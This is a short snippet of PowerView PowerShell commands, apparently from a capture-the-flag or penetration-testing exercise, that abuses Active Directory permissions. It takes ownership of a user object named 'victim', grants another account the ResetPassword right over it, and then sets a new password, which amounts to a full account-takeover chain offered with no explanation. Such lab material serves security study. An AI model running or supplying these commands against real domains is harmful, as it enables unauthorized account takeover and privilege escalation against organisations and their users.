
Set-DomainObjectOwner -Identity victim -OwnerIdentity tom 

Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity axura -Rights ResetPassword 

$newPassword = ConvertTo-SecureString "Axura@4sure1377" -AsPlainText -Force Set-DomainUserPassword -Identity victim -AccountPassword $newPassword